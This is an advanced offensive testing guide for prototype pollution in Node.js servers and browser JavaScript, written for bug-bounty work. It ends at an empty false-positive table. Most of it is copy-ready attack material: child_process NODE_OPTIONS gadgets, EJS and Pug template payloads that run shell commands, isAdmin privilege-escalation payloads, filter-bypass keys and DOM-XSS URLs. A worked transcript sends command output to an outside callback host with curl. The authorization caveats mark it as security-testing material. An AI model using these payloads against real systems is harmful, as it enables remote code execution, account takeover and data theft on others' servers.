# Prototype Pollution — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Prototype Pollution (server-side Node.js **and** client-side browser JavaScript)
**Impact ceiling:** **RCE** (server-side, via gadgets) · **DOM XSS** (client-side) · **authentication/authorization bypass** (gadget-free) · **SSRF / open-redirect / CORS / cache-poisoning** (property injection) · **DoS**.
**Primary CWE:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes — "Prototype Pollution") → escalates to CWE-94 (code injection/RCE), CWE-78 (OS command), CWE-79 (DOM-XSS), CWE-287/269 (authz bypass).

> ⚠️ **Advanced guide.** Get the fundamentals first from **PortSwigger Web Security Academy — Prototype pollution** (client + server), **Gareth Heyes' server-side prototype pollution research**, **Olivier Arteau "Prototype pollution attacks in NodeJS" (NorthSec 2018)**, **"Silent Spring: Prototype Pollution Leads to RCE in Node.js" (USENIX 2023)**, **HackTricks — Prototype Pollution**, and **PayloadsAllTheThings**. This guide assumes you understand JS prototypal inheritance — it teaches you how to find the *source*, land a *gadget*, and prove *RCE / XSS / auth-bypass*, with the exact payloads.

---

## Read this first — why prototype pollution is a top-tier JS bug

Every JavaScript object inherits from `Object.prototype`. If an attacker can add a property to `Object.prototype`, that property silently appears on **every object in the process** — including ones the app creates later and reads without checking. You've effectively injected a **global variable the developer never declared**. When some other code path reads that undeclared property to decide *what command to spawn*, *what HTML to render*, or *whether you're an admin*, your injected value takes over → **RCE, DOM-XSS, or auth bypass**.

> 🔰 **In plain words — the anchor for this whole kit.** Think of every JavaScript object as an **employee**, and `Object.prototype` as the **company handbook every employee consults when they're asked something they don't personally know.** Ask an employee "are you an admin?" — if it's not written on their own badge, they flip to the handbook and read whatever it says there. Normally the handbook is read-only. **Prototype pollution is finding a way to scribble a new line into that shared handbook.** Once you write *"isAdmin: true"* into it, every employee who's asked "am I an admin?" and doesn't have their own answer now reads *your* line and says **yes** — including employees hired *after* you wrote it. Three pieces make the attack:
> - **Source** = the trick that lets you write into the handbook (a careless "merge these settings" or "set this nested key" operation that copies your special `__proto__` key straight into it).
> - **Gadget** = some *other* bit of code that later asks the handbook a *dangerous* question — "what command should I run?", "what HTML goes in this box?", "is this user an admin?".
> - **Impact = Source + Gadget.** Writing a line nobody ever reads is harmless; the payday is when a dangerous question gets answered by your line → **run my command (RCE)**, **inject my script (XSS)**, or **make me admin**.
>
> So "I set `Object.prototype.foo`" is just *"I scribbled in the handbook"* — the finding is *"and then an employee acted on it."* Keep this picture; every section is either how to scribble (Source) or which question you get answered (Gadget).

Why it pays **High/Critical**:
- **Server-side (Node) → RCE.** A pollution source (`_.merge`, `$.extend(true)`, `_.set`) plus a known **gadget** (`child_process` options, EJS/Pug template options, `NODE_OPTIONS=--require`) is remote code execution. This is how Kibana (CVE-2019-7609) and countless bounty targets fell, and it is systematized in the *Silent Spring* research (USENIX 2023).
- **Client-side → DOM-XSS.** Pollute a config property that a library later reads into a `script.src`/`innerHTML`/`srcdoc` sink → XSS that often bypasses input filters entirely (the payload arrives through the *prototype*, not the sanitised input path).
- **Logic/auth bypass with no gadget needed.** Pollute `isAdmin`/`role`/`isAuthenticated` and any object that checks `obj.isAdmin` *without owning the property* now says true — a one-line Critical.
- It's **framework-wide**: one vulnerable merge poisons the whole process, so the blast radius is the entire app and every user.

**Report impact, not the pollution.** "`Object.prototype.foo` becomes `bar`" is the *primitive*. "I executed `id` on your server" / "I ran script in the victim's session" / "I became admin" is the finding. **Prototype Pollution = Source + Gadget.** Always drive to the gadget and the concrete impact — a bare pollution primitive is triage-rejected on mature programs.

**The core mental model:**
1. **Source** — the pollution primitive: an operation that recursively walks attacker-controlled keys (`__proto__`, `constructor.prototype`) into an object it merges/sets/clones/parses.
2. **Gadget** — a sink elsewhere that reads an *undeclared* property (that the attacker now controls via the prototype) and does something dangerous with it.
3. **Impact = Source + Gadget.** A source alone is a *primitive*; you must find the gadget to prove RCE/XSS. (Server-side, even a source alone can be Medium via property injection, but chase the gadget.)

---

## Master Testing Sequence

1. **Identify the environment** — Node server-side, browser client-side, or both (many apps are vulnerable in both; test both surfaces on every target).
2. **Find the source** — a recursive merge, path-based set, deep clone, query-string/JSON parse, or a known-vulnerable dependency version (lodash/jQuery/minimist/yargs-parser) that accepts attacker keys.
3. **Confirm pollution** — client: `Object.prototype.x` in the console; server: the **blind SSPP oracles** (`json spaces`, `status`, `exposedHeaders`, charset…). Always baseline first, pollute, re-request, diff.
4. **Find a gadget** — `child_process` / template engine / library / logic property → escalate to **RCE**, **DOM-XSS**, or **auth bypass**.
5. **Bypass filters if blocked** — `constructor.prototype`, array-forms, encodings, sanitiser weaknesses.
6. **Validate → severity → SAFE-PoC** (pollution is **global + persistent** server-side — extreme care) **→ report** with Source + Gadget + Impact.

---

# PART I — Find the source (the pollution primitive)

## 1.1 The payload roots

There are only a handful of "magic words" that resolve to the shared prototype instead of the object in front of you:

```
__proto__                         # direct: obj.__proto__ === Object.prototype
constructor.prototype             # obj.constructor.prototype === Object.prototype
constructor[prototype]            # bracket form (survives dot-based key filters)
__proto__.__proto__               # occasionally needed through arrays / nested wrappers
```

So the polluting keys are `__proto__` **or** `constructor` then `prototype`. Filters that block only the literal `__proto__` are bypassed with `constructor.prototype` — see PART V.

> **In plain words:** there are only a couple of magic words that mean "the shared handbook" instead of "this one object." `__proto__` is the direct one — every object has it, and it points straight at the handbook. `constructor.prototype` is the scenic route to the *same* handbook (an object → its constructor → that constructor's prototype = `Object.prototype`). This matters because lots of apps naively blocklist the literal string `__proto__` and think they're safe — you just walk in the side door with `constructor.prototype` instead and reach the exact same place.

**Why `constructor.prototype` reaches the same place (so you can explain it in a report):** for any object `o`, `o.constructor` is the function that built it (usually `Object`), and a function's `.prototype` is the object it stamps onto everything it builds — which is `Object.prototype` itself. So `o.constructor.prototype === o.__proto__ === Object.prototype`. Two different key paths, one shared target.

## 1.2 Vulnerable operations (what to look for in code / behaviour)

| Operation | Examples | Notes |
|-----------|----------|-------|
| **Recursive merge / deep extend** | `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `_.defaults`, `$.extend(true, …)`, `Hoek.merge/applyToDefaults`, `deepmerge`, `merge-deep`, `assign-deep`, hand-rolled `merge(target, source)` | The **#1 source.** Recurses into `source.__proto__` and copies its keys onto the target's prototype. |
| **Path-based set** | `_.set(obj,'a.b.c',v)`, `_.setWith`, `dot-prop`, `object-path`, `mpath`, `set-value`, `bracket-notation` | `_.set(o,'__proto__.x',v)` or `set(o,'constructor.prototype.x',v)` pollutes directly. |
| **Deep clone** | `_.cloneDeep`, `clone-deep`, custom recursive clone | Pollutes if it copies `__proto__` while walking. |
| **Query-string parse** | `qs` (`extended:true` / old versions), `query-string`, Express `req.query`, `body-parser` (urlencoded extended) | `?__proto__[x]=y` → `{__proto__:{x:'y'}}`; then any merge of `req.query`/`req.body` lands it. |
| **JSON body + merge** | `JSON.parse(body)` then merged into config/user/session | `{"__proto__":{"x":"y"}}` — the most common bug-bounty vector. |
| **`Object.assign` into a fresh object then deep-op** | nested config builders | shallow `assign` alone doesn't pollute; a **nested** merge downstream does. |
| **Config/flatten libs** | `flat`/`unflatten`, `confidence`, `nconf`, `dotenv`-style expansion | `unflatten({"__proto__.x":"y"})` pollutes. |
| **CLI arg parsers** | `minimist`, `yargs-parser` (old) | `--__proto__.x=y` from argv → pollution (relevant to build servers / CI / desktop apps). |

> **In plain words:** how does your scribble actually reach the handbook? Through operations that **walk into nested keys and copy them over blindly.** The classic is a "deep merge" (`_.merge`, `$.extend(true, …)`) — you send `{"__proto__":{"isAdmin":true}}`, the merge sees a key literally called `__proto__`, dutifully steps *into* it, and copies `isAdmin:true`… onto the handbook itself. Same idea with "set this dotted path" (`_.set(obj, '__proto__.isAdmin', true)`). The common thread: the code trusts *your* key names and follows them recursively. A plain shallow copy (`Object.assign` with no nesting) is safe; it's the **recursive** ones that bite.

**Grep the target's server code / JS bundles for the sources:**
```bash
grep -REn "\.merge\(|\.mergeWith\(|defaultsDeep|\$\.extend\(\s*true|\.set\(|setWith|cloneDeep|deepmerge|merge-deep|object-path|dot-prop|unflatten|Hoek\.(merge|applyToDefaults)" .
# and fingerprint known-vulnerable versions:
grep -REn "\"lodash\"|\"jquery\"|\"minimist\"|\"yargs-parser\"|\"set-value\"|\"merge\"|\"deep-set\"" package.json package-lock.json yarn.lock
```
Old **lodash (<4.17.12)**, **jQuery (<3.4.0)**, **minimist (<1.2.3)**, **yargs-parser (<13.1.2 / 15.0.1 / 18.1.1)**, **set-value/merge/deep-set** are CVE-ridden — a matching version in the lockfile is a strong lead before you even send a payload.

## 1.3 Input vectors (where you plant `__proto__`)

- **JSON body:** `{"__proto__":{"polluted":"x"}}` / `{"constructor":{"prototype":{"polluted":"x"}}}` — primary server-side vector.
- **Query string:** `?__proto__[polluted]=x` · `?__proto__.polluted=x` · `?constructor[prototype][polluted]=x` — depends on the parser (`qs` bracket vs dot).
- **Form / multipart:** `__proto__[polluted]=x` (urlencoded/multipart bodies parsed with extended `qs`).
- **Path / route params, headers, cookies** — if the app parses them into objects and merges.
- **Nested app data (second-order):** user-profile JSON, saved settings, webhook payloads, imported config files, JWT claims that get merged, message-queue payloads — the pollution fires when the stored blob is later merged. Second-order PP is a favourite because it dodges request-time WAFs.
- **GraphQL / REST JSON variables**, **YAML/TOML config uploads** parsed to objects, **XML→JSON** bridges.

---

# PART II — Detection

## 2.1 Client-side detection (browser) — fast and visible

```
# navigate with a URL pollution vector, then check the console:
https://target/?__proto__[polluted]=yes
https://target/?__proto__.polluted=yes
https://target/#__proto__[polluted]=yes        # hash-based (client-side router / SPA)
https://target/?constructor[prototype][polluted]=yes   # side-door if __proto__ is stripped

> Object.prototype.polluted        // "yes"  => POLLUTED (a fresh {} now carries it)
> ({}).polluted                    // "yes"  => confirms it's global, not reflected input
```
Or via a JSON POST the client merges into its state. **Burp DOM Invader** (in the built-in browser) automates *both* source discovery and gadget scanning — enable "Prototype pollution", let it crawl, and it reports the exact vector + any reachable gadget/sink. **PPScan** and **pp-finder** are browser-extension/CLI alternatives.

## 2.2 Server-side detection (SSPP — usually blind)

Server-side pollution has no console, so use **side-effect oracles** — pollute a property that a framework reads *globally into every response*, then observe a later, unrelated response change. **Baseline → pollute → re-request → diff.** Never rely on a single blip; require a repeatable change vs a clean baseline.

> **In plain words:** on a server you can't peek inside the handbook — there's no browser console to type `Object.prototype.x`. So you prove the scribble worked *by its side effects*: you write a line into the handbook that you *know* the framework reads for every response, then watch a later, unrelated response change. The cleanest is Express's **`json spaces`** setting — it controls how much indentation JSON responses get. Normally responses are compact. You scribble `{"__proto__":{"json spaces":10}}`, then fetch any JSON endpoint again — if it suddenly comes back indented with 10 spaces, the handbook is polluted, confirmed. It's a blind bug, so you're always looking for these "watch an unrelated response flip" tells.

**The oracle catalogue (try in this order — strongest/cleanest first):**
```jsonc
// 1) Express "json spaces" — pollutes JSON.stringify indentation of ALL later JSON responses (best, benign):
{"__proto__":{"json spaces":10}}
//    then any JSON response comes back indented with 10 leading spaces  => POLLUTED

// 2) status / statusCode override:
{"__proto__":{"status":510}}          // a later response returns HTTP 510

// 3) CORS reflection (cors middleware reads options off a plain object):
{"__proto__":{"exposedHeaders":["x8bit"]}}   // Access-Control-Expose-Headers: x8bit appears
{"__proto__":{"origin":true,"credentials":true}}

// 4) content-type / charset injection into responses:
{"__proto__":{"content-type":"text/html; charset=x8bit"}}

// 5) parameter-limit / type-confusion crash oracle (a clean 200 -> 400/500 flip):
{"__proto__":{"parameterLimit":1}}    // subsequent multi-param requests error out
{"__proto__":{"allowDots":true}}      // qs behaviour flips

// 6) 0-length / body-parser limits, view-cache, x-powered-by, etag — framework-dependent extras
{"__proto__":{"x-powered-by":"x8bit"}}
```

**The universal fallback — a reflected-property "canary".** When no framework oracle fires, look for *any* endpoint that serialises a fresh object back to you (an error object, a `{}` default, a JSON echo). Pollute an unusual property and see it appear in that serialisation:
```jsonc
{"__proto__":{"zzcanary":"x8bit-2f1a"}}   // then hunt "x8bit-2f1a" in a later response that echoes an object
```

The **`json spaces`** oracle is the most reliable and the most benign — prefer it. Automate the whole baseline→pollute→re-request→diff loop with `poc/pp_probe.py` (it is control-baselined to keep false positives near zero).

> **CAUTION:** server-side pollution is **process-global and persists until restart**. Use benign, reversible-ish markers, avoid properties that break the app, and never pollute production into an outage. See SAFE-PoC (§7.3).

## 2.3 Confirming it's genuinely prototype pollution (not reflection)

- The injected property must appear on **objects the attacker didn't create** — a *fresh* `{}` has it. Client: `({}).polluted === 'yes'`. Server: the oracle response changed for an *unrelated* request.
- **Rule out plain reflected input** (echoing your key back is *not* pollution). Pollution is *global* and *persists* across requests until restart.
- Prove **persistence**: after polluting, a *different* connection/request still sees the effect.

---

# PART III — Server-side exploitation (→ RCE)

Once you have a source + confirmed pollution, land a **gadget**. Match the gadget to what the target actually runs (fingerprint the template engine, spot `child_process` usage, read the dependency list). The famous families:

## 3.0 The full attack, end-to-end — blind SSPP → `json spaces` oracle → `child_process` RCE (worked transcript) ⭐

> *This is the flagship worked example* — the highest-impact prototype-pollution path (server-side → RCE) stitched into one wire-level walk. It shows the discipline that makes SSPP reportable: **baseline → pollute → re-request → diff**, confirm it's *global* (not reflection), then land a gadget. Own instance / authorized target; benign marker, and mind the process-global caution (§7.3).

**Target.** An Express (Node) API at `api.target.com` with a profile endpoint that **deep-merges** your JSON body into a settings object (`_.merge(userSettings, req.body)`) — the classic source (§1.2). Goal: prove it reaches RCE, not just "a property was accepted."

**Step 1 — baseline the oracle (§2.2).** Pick the cleanest, most benign oracle first — Express's `json spaces`, which controls JSON indentation of *every* later response. Record the normal shape:
```http
GET /api/profile HTTP/1.1
Host: api.target.com
```
```
HTTP/1.1 200 OK
{"id":1001,"name":"alice","plan":"free"}          # compact, no indentation — the baseline
```

**Step 2 — pollute via the merge sink.** Send `__proto__` in the body the endpoint merges:
```http
POST /api/profile/update HTTP/1.1
Host: api.target.com
Content-Type: application/json

{"__proto__":{"json spaces":10}}
```
```
HTTP/1.1 200 OK
{"updated":true}                                   # no visible effect here — SSPP is blind
```

**Step 3 — re-request an UNRELATED endpoint and diff (the confirmation).**
```http
GET /api/profile HTTP/1.1
Host: api.target.com
```
```
HTTP/1.1 200 OK
{
          "id": 1001,
          "name": "alice",
          "plan": "free"
}                                                  # now indented 10 spaces → Object.prototype was polluted
```
The indentation appeared on a response I didn't pollute directly — the setting fell through the polluted prototype into `JSON.stringify`. **That is confirmed server-side prototype pollution**, not reflection (§2.3): a *fresh* response object inherited my property. Confirm persistence by hitting a *third* endpoint (`/api/health`) — still indented = process-global, until restart.

**Step 4 — fingerprint the RCE gadget (§3.1).** Pollution alone is High; RCE needs a gadget the app actually reaches. I read the JS bundle / behaviour and see the app shells out (an avatar-to-PDF/image job uses `child_process.spawn`) and builds the options object without setting every key — the Silent-Spring precondition. The **no-file-write** gadget (B) fits: pollute `NODE_OPTIONS=--require /proc/self/environ` and smuggle the JS into an env var, so the next spawned Node child executes it.

**Step 5 — land the gadget, benign marker only.** Re-pollute with the execution-controlling options (from §3.1 Gadget B), then trigger the child-process path (request the PDF/image job). The next `spawn` inherits the polluted `NODE_OPTIONS`:
```http
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('curl https://OOB.oast.fun/$(id|base64)')//"}}}
```
```
# then trigger the child_process (e.g. POST /api/avatar/export) → the spawned node loads /proc/self/environ →
# your EVIL env var executes → OOB hit:
[interactsh] DNS/HTTP  uid=33(...)-base64...  from api.target.com egress   → RCE CONFIRMED
```
An OOB callback carrying `id` output = **arbitrary command execution as the Node process** — Critical. One benign marker (an OOB ping / a unique file), then **STOP**.

**Step 6 — clean up (mandatory for PP).** Prototype pollution is **process-global and persists until restart** (§7.3). Don't leave a broken `json spaces`/`status`/`NODE_OPTIONS` on the prototype — where the app exposes a reset or the pollution is per-request-object, revert it; otherwise note in the report that a restart clears it and never pollute a property that degrades production.

**Why this is the PP-defining path.** The bug is invisible (`{"updated":true}` told you nothing) — the finding lives entirely in the **oracle diff** (an unrelated response changed shape) and the **gadget** (a missing option key fell through to your polluted prototype). Source → blind-confirm via a benign oracle → gadget → RCE, and the same source also drives the gadget-free auth bypass (§3.4, `{"__proto__":{"isAdmin":true}}`) and client-side DOM-XSS (Part IV).

## 3.1 `child_process` gadgets — the RCE workhorse (Silent Spring)

When the app later calls `child_process.spawn/exec/execFile/fork/execSync` and builds the **options** object without setting every key, the missing keys fall through to the polluted prototype. Inject execution-controlling options:

> **In plain words:** this is the classic path to *running commands* on the server. When Node launches another program, it passes an "options" bag (which shell to use, what environment variables to set, the working directory, etc.). If the app builds that bag but leaves some options unset, Node — like our employee — checks the *handbook* for the missing ones. So you scribble those options into the handbook ahead of time. The reliable modern trick is polluting **`NODE_OPTIONS`** to `--require=<file>`: it forces the next Node child process to load and run a file you point at. This is exactly the *Silent Spring* (USENIX 2023) chain.

**Gadget A — `NODE_OPTIONS=--require` with a written/uploaded file** (needs any file-write primitive; cross-ref [File Upload](#/fileupload/guide)):
```jsonc
{"__proto__":{
  "NODE_OPTIONS":"--require=/tmp/evil.js",
  "env":{"NODE_OPTIONS":"--require=/tmp/evil.js"},
  "shell":"node","argv0":"node"
}}
// evil.js contents:  require('child_process').execSync('id > /tmp/pp_rce')
// fires the next time the app spawns ANY node child process
```

**Gadget B — no file write needed: `--require /proc/self/environ`** (the environment *is* the "file"). You smuggle the JS into an env var; `/proc/self/environ` is a readable pseudo-file containing those vars, and Node `--require` will execute it as JS (the non-JS bytes throw after your payload has already run):
```jsonc
{"__proto__":{
  "env":{"EVIL_CMD":"console.log(require('child_process').execSync('id').toString())//"},
  "NODE_OPTIONS":"--require /proc/self/environ",
  "argv0":"node"
}}
```

**Gadget C — direct `shell`/`argv0` option abuse** (exact keys depend on the call site — `exec` vs `spawn` vs `execFile`, and whether `{shell:true}`):
```jsonc
{"__proto__":{"shell":"/proc/self/exe","argv0":"-e","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
```

**Prove it, then stop.** For validation use a benign, unmistakable marker: `execSync('id')` returning `uid=`, or an **OOB callback** (`curl http(s)://<collab>/pp-$(hostname)`) so a blind spawn still confirms. One command, then STOP (§7.3).

## 3.2 Template-engine gadgets — very common RCE

Server-side template engines read compile options off a plain object → pollute those options. Miss an option, the engine checks the handbook. Some options let you inject raw code into the generated render function.

> **In plain words:** template engines (EJS, Pug, Handlebars…) turn a template into JavaScript and run it — and they read a pile of *compile options* off a plain object first. Miss an option, and they check the handbook. Some of those options let you inject raw code into the generated function (EJS's `outputFunctionName`, Pug's `compileDebug`). So you scribble a booby-trapped value into that option, and the *next time the app renders any template*, your code is baked into it and runs → **RCE**. Match the exact gadget to whichever engine the target actually uses.

**EJS** — `outputFunctionName` (the best-known EJS PP→RCE gadget):
```jsonc
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');var y"}}
// alternates when outputFunctionName is set: escapeFunction, localsName, compileDebug+client, destructuredLocals
```

**Pug / Jade** — `compileDebug` + injected debug line (Silent Spring documents the exact chain):
```jsonc
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}
// Pug also has a "block"/"Text" node-injection variant on some versions
```

**Handlebars** — `compilerOptions`/partials-path prototype gadgets; **Nunjucks** — `autoescape`/`taggingUnclosed` edges; **doT** — `varname`/`strip` gadgets; **Lodash `_.template`** — `sourceURL`/`variable` injection; **Vue SSR** — render-option gadgets. Each has a documented payload — match it to the engine and version (see the arsenal's gadget catalogue). The pattern is identical: pollute the compile option, trigger the next render.

**Fingerprint the engine first** (so you pick the right gadget): look at response headers (`X-Powered-By`), error stack traces (they name `ejs`/`pug`/`handlebars`), file extensions (`.ejs`/`.pug`/`.hbs`), and the dependency list if you have a bundle.

## 3.3 Other library / framework gadgets

The ecosystem has a large, growing gadget catalogue (PortSwigger's server-side-PP research maintains one). High-value non-template gadgets:
- **`child_process` via app libs** that spawn (image processors, PDF/vips/ghostscript wrappers, git wrappers).
- **`nodemailer`** (sendmail path / `path` option → command), **`mongoose`/`mquery`** (query option injection → NoSQLi-style), **`undici`/proxy** options (SSRF via polluted `proxy`/`uri`), **`ansi-html`**, **`vm2` escapes**, **`require` cache / module resolution** tricks.
- **`express`/`connect`** internals (`view engine`, `view cache`, `trust proxy` behaviour), **`body-parser`** limits, **`csurf`**/session middleware option pollution → auth/CSRF weakening.
Match the gadget to the libraries the target actually loads — a gadget for a library that isn't present is not a finding.

## 3.4 Authentication / authorization bypass (no gadget needed) — test this FIRST

If the app checks a property on an object it doesn't own:
```jsonc
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"admin":true,"isAdmin":true,"is_admin":true,"privileged":true}}
{"constructor":{"prototype":{"isAuthenticated":true}}}
```
Any later `if (user.isAdmin)` where `user` lacks its *own* `isAdmin` now reads the polluted `true` → **privilege escalation**. This is a clean, high-value, gadget-free win — test it *early*, before the RCE hunt.

> **In plain words:** this is the simplest, most direct win and needs *no* gadget hunting — you go straight for the handbook entry the app checks for permissions. If the code somewhere does `if (user.isAdmin)` and a normal user object simply *doesn't have* an `isAdmin` field of its own, then it consults the handbook — so you scribble `isAdmin: true` there and now **everyone** reads back "admin." Try `isAdmin`, `role`, `isAuthenticated` early; it's often a clean Critical with a one-line payload. (Just remember the handbook is *global* — you may briefly flip other users to admin too, so mind the SAFE-PoC rules in §7.3.)

## 3.5 Framework-specific RCE (real chains)

- **Kibana — CVE-2019-7609 (Timelion).** A client-supplied Timelion expression polluted the prototype; a later `child_process.spawn` for the canvas/reporting worker read polluted `env`/`NODE_OPTIONS`-style options → RCE as the Kibana user. The canonical "PP is real RCE, not theory" case.
- **Blitz.js / Next-style RPC (s1r1us).** A deserialise+merge of the RPC payload polluted the prototype; an EJS/`child_process` gadget downstream → RCE. Pattern: any RPC/GraphQL layer that `merge`s untrusted input into an options-bearing object.
- **Parse Server, various npm apps** — repeated HackerOne pattern: JSON body → `_.merge` into config → template/`child_process` gadget → RCE.

## 3.6 Electron / desktop & CLI (don't skip these)

Prototype pollution in an **Electron** main/renderer or a **CLI tool** (via `minimist`/`yargs-parser` over argv, or a config file merge) reaches Node APIs directly → RCE with no browser sandbox. If the target ships a desktop app or a CLI that parses args/config, test `--__proto__.x=y` and config-file `__proto__` keys.

## 3.7 DoS

Polluting a property that breaks object handling process-wide (a getter that throws, a numeric/string type the framework mis-uses, `toString`/`then` making objects look like thenables) crashes or degrades the whole app. Real but **destructive** — demonstrate only on a lab/own instance; note the risk in the report, don't nuke prod.

## 3.8 SSPP without a known gadget — property injection (still High)

Even without RCE, server-side pollution can inject into the app's behaviour:
- **CORS** (`origin`, `credentials`, `exposedHeaders`) → cross-origin data theft (cross-ref [CORS](#/cors/guide)).
- **Redirect** — a polluted `location`/`url`/`Location` → open redirect / SSRF (cross-ref [Open Redirect](#/openredir/guide), [SSRF](#/ssrf/guide)).
- **Cache / headers** — polluted cache-control or a header value → cache poisoning (cross-ref [Web Cache](#/webcache/guide), [Host Header](#/hostheader/guide)).
- **Reflected config → XSS** — a polluted value rendered into HTML.
Medium–High depending on what you can inject and reach.

---

# PART IV — Client-side exploitation (→ DOM XSS)

## 4.1 The gadget concept

A client-side gadget is a script that reads an **undeclared config property** and passes it to a dangerous sink. You pollute that property via the URL/JSON/hash, the library reads it off the prototype, and it lands in the sink → XSS.

> **In plain words:** the browser has its own handbook (the page's `Object.prototype`), and you can often scribble in it just by putting `?__proto__[x]=y` in the URL. The gadget here is a **library on the page that reads a config setting it doesn't have**, then hands that value to something dangerous — like sticking it into `innerHTML`, or using it as a `<script src>`. So you scribble that setting to be an XSS payload (`?__proto__[html]=<img src=x onerror=alert(1)>`), the library reads it off the handbook, drops it into the page, and your script runs. The nasty part: because the value arrives via the *prototype* rather than the normal input, it frequently sails past the app's input filters entirely. Burp's **DOM Invader** automates finding both the scribble-point and the gadget.

```
Sinks that become XSS via a polluted config value:
  element.innerHTML / outerHTML     <-  a polluted "html" / "content" / "template" option
  script.src / iframe.src           <-  a polluted "src" / "url" / "baseURL" / "callback"
  iframe.srcdoc                     <-  a polluted "srcdoc"
  eval / setTimeout(string) / Function / setInterval(string)
  location / a.href                 <-  open redirect / javascript: URL
  jQuery $(html), $.parseHTML       <-  html injection sink
```

## 4.2 Client-side sources (where you scribble in the browser)

- **URL query:** `?__proto__[x]=y` (needs a param the page parses with a `qs`-like splitter).
- **URL hash:** `#__proto__[x]=y` (SPA routers/`location.hash` parsers) — doesn't hit the server, dodges server WAFs.
- **`JSON.parse(...)` + client merge** of an API response or `postMessage` data.
- **`postMessage`** payloads merged into state; **cookies** parsed to objects.

## 4.3 Known library gadgets (identify the lib, then use its gadget)

PortSwigger's *"widespread prototype pollution gadgets"* research + BlackFan's *client-side-prototype-pollution* collection catalogue these. High-hit ones:
- **jQuery** — `$.extend(true, …)` (source) and `htmlPrefilter` / `$(html)` (gadget); older jQuery `$.ajax` `url`/`dataType`.
- **Google Analytics / gtag**, **Segment/analytics.js**, **Google Tag Manager** — read config into script `src`.
- **Closure**, **Wistia**, **Swiftype**, **Adobe DTM / Launch**, **Vue** (config edges), **Chart.js**, **DOMPurify config** (`ALLOWED_ATTR`, `RETURN_DOM`), **sanitize-html** options.

Generic trigger patterns (swap the property for the specific library's gadget):
```
https://target/?__proto__[src]=data:,alert(document.domain)         # a lib reads config.src into a <script src>
https://target/?__proto__[html]=<img src=x onerror=alert(1)>        # a lib reads config.html into innerHTML
https://target/?__proto__[srcdoc]=<script>alert(1)</script>          # into an iframe srcdoc
https://target/?__proto__[url]=javascript:alert(1)                   # into location/href
```

## 4.4 Non-XSS client-side impact

Client PP can also pollute **CSRF tokens**, **request options** (fetch/axios `baseURL`/`headers` → request smuggling of client requests), **cookie attributes**, or a **redirect URL** → open redirect. Not always XSS, still reportable.

## 4.5 Workflow

1. Find a client-side **source** (URL/hash/JSON the client merges). Confirm with `({}).x`.
2. Enumerate loaded libraries (view-source / `debugger` / bundle) → look up their gadgets.
3. Pollute the gadget property with an XSS payload → trigger the sink (often just a reload). **DOM Invader** automates 1–3 and will point at the exact gadget.

→ **Impact:** DOM-XSS (often filter-bypassing) → session/token theft → ATO in the victim's context.

---

# PART V — Filter / WAF / sanitiser bypass

When the obvious `__proto__` is blocked, you are rarely actually stopped — most defences are shallow.

**Key-path bypasses (block `__proto__` → use the side door):**
```
constructor.prototype.x              # dot form
constructor[prototype][x]            # bracket form (beats dot-splitting blocklists)
__proto__[__proto__][x]              # double-hop through wrappers
{"constructor":{"prototype":{"x":"y"}}}    # JSON nested form
```

**Encoding / mangling (beat naive string filters):**
- Case / spacing won't help (keys are literal), but **bracket vs dot** and **array-index forms** (`a[__proto__][x]`) exploit parser quirks.
- **`qs` vs `querystring`** differ: `?a[__proto__][b]=1` pollutes under `qs` (bracket depth) but not the legacy `querystring` — try both encodings.
- **Unicode / homoglyphs** rarely work (the runtime compares literal `"__proto__"`), so don't waste time there — focus on `constructor.prototype` and structure.

**Defeating sanitisers ("we strip `__proto__`"):**
- **Strip-once flaws:** a filter that removes `__proto__` a single time is beaten by `__pro__proto__to__` (removing the inner match reassembles `__proto__`).
- **Only-top-level checks:** a guard that inspects the top-level keys but not nested ones is beaten by burying the payload one level deeper.
- **`Object.freeze(Object.prototype)`** blocks *writes to Object.prototype* but **not** pollution of *other* prototypes (`Array.prototype`, a class prototype) or `constructor.prototype` chains on non-frozen intrinsics — and many apps freeze late (after the vulnerable merge already ran once at boot).
- **`Object.create(null)` / `Map`** as the merge target is a real fix *for that object*, but the app usually still has other plain-object merges — find one of those.
- **`--disable-proto=delete`/`throw` (Node flag)** removes the `__proto__` accessor → use `constructor.prototype` (unaffected).

If a WAF blocks the request outright, move to a **second-order** vector (store the payload where request-time filtering doesn't see it) or the **hash** vector client-side.

---

# PART VI — Escalate & chain ("you found X → do Y")

| You found | Do this | Severity |
|-----------|---------|----------|
| Client-side source (`({}).x` set) | Enumerate loaded libs → pollute their gadget `src`/`html`/`srcdoc` → **DOM-XSS** | High |
| Server-side SSPP confirmed (`json spaces`) | Fingerprint engine/libs → `child_process`/EJS/Pug gadget → **RCE**; or `isAdmin` → **privesc** | Critical/High |
| Source but no known gadget (server) | Property-inject into CORS/redirect/cache/reflected-HTML → chain to XSS/open-redirect/cache-poisoning | Medium/High |
| `__proto__` blocked | `constructor.prototype` / `constructor[prototype][x]` / strip-once bypass (PART V) | — |
| Auth object checks `obj.isAdmin` | `{"__proto__":{"isAdmin":true}}` → admin (test this first) | Critical |
| A later `child_process` spawn | Pollute `NODE_OPTIONS=--require`/`shell`/`env` → RCE (pair with file-write or `/proc/self/environ`) | Critical |
| Request-time WAF blocks the payload | Store it (second-order) or use the client `#__proto__` hash vector | — |
| Vulnerable lib version in lockfile | Map to its CVE + known gadget; that's a strong report even before firing | High/Critical |

**Chains:** [NoSQL Injection](#/nosqli/guide) (both abuse object keys / `__proto__` in JSON bodies), [File Upload](#/fileupload/guide) (drop the `--require` file for `NODE_OPTIONS` RCE), [CORS](#/cors/guide) & [Host Header](#/hostheader/guide) & [Web Cache](#/webcache/guide) (property-injection targets), [Open Redirect](#/openredir/guide) & [SSRF](#/ssrf/guide) (polluted `location`/proxy), [XSS](#/xss/guide) (client-side gadget → DOM-XSS escalation), [REST](#/rest/guide) & [GraphQL](#/graphql/guide) (JSON bodies/variables as the pollution vector).

---

# PART VII — Validity, false positives, severity, reporting

## 7.1 False-positive auto-reject table

| Observation | Why it's NOT (yet) a finding | What makes it real |
|-------------|------------------------------|--------------------|
